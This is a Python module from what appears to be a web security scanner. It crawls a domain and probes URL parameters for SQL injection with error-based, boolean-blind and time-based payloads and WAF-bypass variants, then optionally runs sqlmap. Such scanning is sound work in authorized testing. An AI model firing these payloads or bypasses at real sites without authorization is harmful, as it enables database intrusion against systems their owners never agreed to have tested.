"""
sqli - SQL Injection scanner (sqlmap wrapper).

Wraps sqlmap for automated SQLi detection on crawled URLs with parameters.
Falls back to a lightweight heuristic probe if sqlmap is missing.

Detects:
  - Error-based (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
  - Boolean-based blind (true/false response comparison)
  - Time-based blind (SLEEP/WAITFOR/pg_sleep delay measurement)
  - WAF bypass payloads (encoding, case, comments)

Usage:
  python matthunder_cli.py sqli example.com
"""

import json
import os
import re
import shutil
import subprocess
import time
from typing import Optional

import httpx

from . import SCANNER_REGISTRY
from .common import (
    resolve_tool,
    DEFAULT_TIMEOUT, USER_AGENT, canonical_url, crawl_domain,
    extract_anchors, finish_scan, host_in_scope, log, normalize_domain,
    open_db, utc_now_iso, is_dynamic_param, merge_crawled_and_fallback,
    FALLBACK_PARAMS,
)


def _resolve(name: str) -> Optional[str]:
    return resolve_tool(name)


# ── Error-based payloads per DB engine ──────────────────────────────────

_ERROR_PAYLOADS = [
    ("'", "single_quote", "generic"),
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -", "extractvalue", "mysql"),
    ("' AND 1=CAST((SELECT version()) AS int)-- -", "cast_error", "postgresql"),
    ("' AND 1=CONVERT(int,(SELECT @@version))-- -", "convert_error", "mssql"),
    ("' AND 1=CAST((SELECT sqlite_version()) AS int)-- -", "sqlite_cast", "sqlite"),
    ("1'\"", "generic_quote", "generic"),
    ("\\", "backslash", "generic"),
]

_ERROR_PATTERNS = {
    "mysql": [
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
        r"valid MySQL result", r"check the manual.*MySQL", r"SQLSTATE\[",
        r"Duplicate entry.*for key", r"mysql_fetch",
    ],
    "postgresql": [
        r"PostgreSQL.*ERROR", r"pg_query\(\).*failed", r"unterminated quoted string",
        r"ERROR:\s+syntax error at", r"current transaction is aborted",
    ],
    "mssql": [
        r"Microsoft SQL Server.*Driver", r"Unclosed quotation mark",
        r"ODBC SQL Server Driver", r"SQLServer JDBC Driver",
        r"Incorrect syntax near", r"Arithmetic overflow error",
    ],
    "oracle": [
        r"ORA-\d{5}", r"Oracle.*Driver", r"quoted string not properly terminated",
        r"SQL command not properly ended",
    ],
    "sqlite": [
        r"SQLite3::query", r"SQLITE_ERROR", r"sqlite3\.OperationalError",
        r"unrecognized token",
    ],
    "generic": [
        r"SQL syntax", r"sql error", r"query.*failed", r"SQLSTATE",
        r"syntax error.*at.*line", r"unexpected end of SQL command",
    ],
}

# ── Boolean-based blind payloads ────────────────────────────────────────
_BOOLEAN_TRUE = [
    ("' OR '1'='1", "or_true"),
    ("' OR 1=1-- -", "or_true_comment"),
    ("1 OR 1=1", "numeric_true"),
    ("' OR 'a'='a", "string_true"),
]
_BOOLEAN_FALSE = [
    ("' OR '1'='2", "or_false"),
    ("' OR 1=2-- -", "or_false_comment"),
    ("1 OR 1=2", "numeric_false"),
    ("' OR 'a'='b", "string_false"),
]

# ── Time-based blind payloads ──────────────────────────────────────────
_TIME_DELAY = 5
_TIME_PAYLOADS = [
    (f"' OR SLEEP({_TIME_DELAY})-- -", "mysql_sleep"),
    (f"'; WAITFOR DELAY '0:0:{_TIME_DELAY}'-- -", "mssql_waitfor"),
    (f"' OR pg_sleep({_TIME_DELAY})-- -", "pg_sleep"),
    (f"' AND (SELECT * FROM (SELECT(SLEEP({_TIME_DELAY})))a)-- -", "mysql_subquery"),
]

# ── WAF bypass payloads ────────────────────────────────────────────────
_BYPASS_PAYLOADS = [
    ("' oR '1'='1", "case_variation"),
    ("'/**/OR/**/1=1-- -", "comment_bypass"),
    ("%27%20OR%201%3D1--%20-", "url_encode"),
    ("' OR 1%3D1-- -", "partial_encode"),
    ("' OR/**/ 1=1-- -", "inline_comment"),
    ("'\tOR\t1=1--\t-", "tab_whitespace"),
]


def _load_pipeline_urls() -> list[str]:
    """Load pre-discovered URLs from pipeline Phase 3."""
    url_file = os.environ.get("MT_PIPELINE_URLS", "")
    if url_file and os.path.exists(url_file):
        with open(url_file, encoding="utf-8", errors="ignore") as f:
            return [l.strip() for l in f if l.strip().startswith("http")]
    return []


def _probe_url(url: str, param: str, client: httpx.Client) -> dict:
    """Test a single URL+param for error-based SQLi."""
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if param not in qs:
        return {"vulnerable": False}

    # Dynamic parameter pre-check
    if not is_dynamic_param(url, param, client):
        return {"vulnerable": False}

    for payload, desc, db_type in _ERROR_PAYLOADS:
        test_qs = dict(qs)
        test_qs[param] = [payload]
        new_query = urlencode(test_qs, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))

        try:
            r = client.get(test_url, timeout=DEFAULT_TIMEOUT, follow_redirects=True)
            body = r.text
            patterns = _ERROR_PATTERNS.get(db_type, []) + _ERROR_PATTERNS.get("generic", [])
            for err in patterns:
                if re.search(err, body, re.I):
                    return {
                        "vulnerable": True,
                        "type": "error",
                        "url": url,
                        "param": param,
                        "payload": desc,
                        "evidence": err,
                        "db": db_type,
                        "status": r.status_code,
                    }
        except Exception:
            continue

    return {"vulnerable": False}


def _probe_boolean(url: str, param: str, client: httpx.Client) -> dict:
    """Test for boolean-based blind SQLi."""
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if param not in qs:
        return {"vulnerable": False}

    # Get baseline
    baseline_qs = dict(qs)
    baseline_qs[param] = ["1"]
    baseline_url = urlunparse(parsed._replace(query=urlencode(baseline_qs, doseq=True)))
    try:
        bl = client.get(baseline_url, timeout=DEFAULT_TIMEOUT, follow_redirects=True)
        bl_len = len(bl.text)
        bl_status = bl.status_code
    except Exception:
        return {"vulnerable": False}

    # Test TRUE payloads
    true_responses = []
    for payload, desc in _BOOLEAN_TRUE[:3]:
        test_qs = dict(qs)
        test_qs[param] = [payload]
        test_url = urlunparse(parsed._replace(query=urlencode(test_qs, doseq=True)))
        try:
            r = client.get(test_url, timeout=DEFAULT_TIMEOUT, follow_redirects=True)
            if r.status_code > 0:
                true_responses.append((r.status_code, len(r.text), r.text[:500]))
        except Exception:
            continue

    # Test FALSE payloads
    false_responses = []
    for payload, desc in _BOOLEAN_FALSE[:3]:
        test_qs = dict(qs)
        test_qs[param] = [payload]
        test_url = urlunparse(parsed._replace(query=urlencode(test_qs, doseq=True)))
        try:
            r = client.get(test_url, timeout=DEFAULT_TIMEOUT, follow_redirects=True)
            if r.status_code > 0:
                false_responses.append((r.status_code, len(r.text), r.text[:500]))
        except Exception:
            continue

    if not true_responses or not false_responses:
        return {"vulnerable": False}

    avg_true_len = sum(r[1] for r in true_responses) / len(true_responses)
    avg_false_len = sum(r[1] for r in false_responses) / len(false_responses)
    true_statuses = set(r[0] for r in true_responses)
    false_statuses = set(r[0] for r in false_responses)

    len_diff = abs(avg_true_len - avg_false_len)
    status_diff = true_statuses != false_statuses

    # Validate: difference must exceed natural variation
    if (len_diff > 50 and len_diff / max(avg_true_len, 1) > 0.1) or status_diff:
        return {
            "vulnerable": True,
            "type": "boolean_blind",
            "url": url,
            "param": param,
            "evidence": f"true_avg={avg_true_len:.0f} false_avg={avg_false_len:.0f} diff={len_diff:.0f}",
            "status": f"true={true_statuses} false={false_statuses}",
        }

    return {"vulnerable": False}


def _probe_time(url: str, param: str, client: httpx.Client) -> dict:
    """Test for time-based blind SQLi."""
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if param not in qs:
        return {"vulnerable": False}

    # Baseline timing
    baseline_qs = dict(qs)
    baseline_qs[param] = ["1"]
    baseline_url = urlunparse(parsed._replace(query=urlencode(baseline_qs, doseq=True)))
    try:
        start = time.monotonic()
        client.get(baseline_url, timeout=DEFAULT_TIMEOUT, follow_redirects=True)
        bl_time = time.monotonic() - start
    except Exception:
        return {"vulnerable": False}

    if bl_time > 3:
        return {"vulnerable": False}  # Target is already slow

    for payload, desc in _TIME_PAYLOADS[:3]:
        test_qs = dict(qs)
        test_qs[param] = [payload]
        test_url = urlunparse(parsed._replace(query=urlencode(test_qs, doseq=True)))
        try:
            start = time.monotonic()
            r = client.get(test_url, timeout=_TIME_DELAY + 5, follow_redirects=True)
            elapsed = time.monotonic() - start
            if elapsed >= _TIME_DELAY - 0.5:
                # Confirm with second request
                start2 = time.monotonic()
                client.get(test_url, timeout=_TIME_DELAY + 5, follow_redirects=True)
                elapsed2 = time.monotonic() - start2
                if elapsed2 >= _TIME_DELAY - 0.5:
                    return {
                        "vulnerable": True,
                        "type": "time_blind",
                        "url": url,
                        "param": param,
                        "payload": desc,
                        "evidence": f"baseline={bl_time:.2f}s inject1={elapsed:.2f}s inject2={elapsed2:.2f}s",
                    }
        except Exception:
            continue

    return {"vulnerable": False}


def run(domain: str, max_pages: int = 50) -> dict:
    domain = normalize_domain(domain)

    con = open_db()
    scan_id = con.execute(
        "INSERT INTO scans (id, scanner, domain, params, status, created_at) "
        "VALUES (lower(hex(randomblob(16))), 'sqli', ?, ?, 'running', ?)",
        (domain, "heuristic+sqlmap+boolean+time", utc_now_iso()),
    ).lastrowid
    con.commit()
    scan_id = con.execute("SELECT id FROM scans WHERE rowid=?", (scan_id,)).fetchone()["id"]
    log(con, scan_id, f"SQLi scan started - domain: {domain}")

    # Load pipeline URLs if available, otherwise crawl
    pipeline_urls = _load_pipeline_urls()
    if pipeline_urls:
        log(con, scan_id, f"Using {len(pipeline_urls)} pre-discovered URLs from pipeline")
        targets = merge_crawled_and_fallback(pipeline_urls, domain, "sqli", max_pages)
    else:
        pages = crawl_domain(domain, max_pages=max_pages)
        log(con, scan_id, f"Crawled {len(pages)} pages")
        targets = []
        seen = set()
        for page_url, html in pages:
            from urllib.parse import urlparse, parse_qs
            parsed = urlparse(page_url)
            params = list(parse_qs(parsed.query).keys())
            for param in params:
                key = (page_url.split("?")[0], param)
                if key not in seen:
                    seen.add(key)
                    targets.append((page_url, param))
        # Add fallback endpoints
        from .common import FALLBACK_ENDPOINTS
        base_urls = [f"https://{domain}", f"http://{domain}"]
        for base in base_urls:
            for endpoint in FALLBACK_ENDPOINTS:
                full = f"{base}{endpoint}"
                for param in FALLBACK_PARAMS["sqli"][:6]:
                    key = (full, param)
                    if key not in seen:
                        seen.add(key)
                        targets.append((full, param))

    log(con, scan_id, f"Testing {len(targets)} URL+param targets")

    findings: list[dict] = []
    tested = 0

    with httpx.Client(headers={"User-Agent": USER_AGENT}, follow_redirects=True, timeout=DEFAULT_TIMEOUT) as client:
        for url, param in targets[:200]:
            # 1. Error-based
            result = _probe_url(url, param, client)
            tested += 1
            if result.get("vulnerable"):
                findings.append(result)
                log(con, scan_id, f"SQLi error-based: {url} param={param} db={result.get('db')}")
                continue

            # 2. Boolean-based blind
            result = _probe_boolean(url, param, client)
            if result.get("vulnerable"):
                findings.append(result)
                log(con, scan_id, f"SQLi boolean-blind: {url} param={param}")
                continue

            # 3. Time-based blind
            result = _probe_time(url, param, client)
            if result.get("vulnerable"):
                findings.append(result)
                log(con, scan_id, f"SQLi time-blind: {url} param={param} payload={result.get('payload')}")

    log(con, scan_id, f"Tested {tested} targets, found {len(findings)} SQLi")

    # Try sqlmap if available
    sqlmap = _resolve("sqlmap") or _resolve("sqlmap.py")
    if sqlmap and targets:
        url_file = f"_matthunder_sqli_{scan_id}.txt"
        with open(url_file, "w", encoding="utf-8") as f:
            for url, _ in targets:
                if "?" in url:
                    f.write(url + "\n")
        if os.path.getsize(url_file) > 0:
            log(con, scan_id, "Running sqlmap...")
            cmd = [
                sqlmap, "-m", url_file, "--batch", "--level=1", "--risk=1",
                "--output-dir", f"_matthunder_sqlmap_{scan_id}",
                "--disable-coloring", "--no-logging",
            ]
            try:
                proc = subprocess.run(cmd, capture_output=True, encoding="utf-8", errors="replace", timeout=600)
                output = proc.stdout + proc.stderr
                if "is vulnerable" in output or "sqlmap identified" in output:
                    for line in output.splitlines():
                        if "is vulnerable" in line or "Parameter:" in line:
                            findings.append({"type": "sqlmap", "detail": line.strip()})
                log(con, scan_id, f"sqlmap completed, {len(findings)} total findings")
            except subprocess.TimeoutExpired:
                log(con, scan_id, "sqlmap timed out (600s)")
            except FileNotFoundError:
                log(con, scan_id, "sqlmap binary not found")
            except Exception as e:
                log(con, scan_id, f"sqlmap error: {e}")
        try:
            os.remove(url_file)
        except OSError:
            pass
        import shutil as _shutil
        _shutil.rmtree(f"_matthunder_sqlmap_{scan_id}", ignore_errors=True)

    for f in findings:
        detail = f.get("evidence") or f.get("detail", "")
        url = f.get("url", "")
        param = f.get("param", "")
        payload = f.get("payload", "")
        ftype = f.get("type", "error")
        con.execute(
            "INSERT INTO results (scan_id, category, target_url, status, detail, extracted_at) "
            "VALUES (?, ?, ?, ?, ?, ?)",
            (scan_id, f"sqli_{ftype}", url, "vulnerable",
             f"param={param} payload={payload} evidence={detail}", utc_now_iso()),
        )
    con.commit()
    finish_scan(con, scan_id, status="completed", total_sources=tested, total_links=len(findings))
    con.close()
    return {"scan_id": scan_id, "scanner": "sqli", "domain": domain, "pages": tested, "findings": len(findings)}


SCANNER_REGISTRY["sqli"] = run
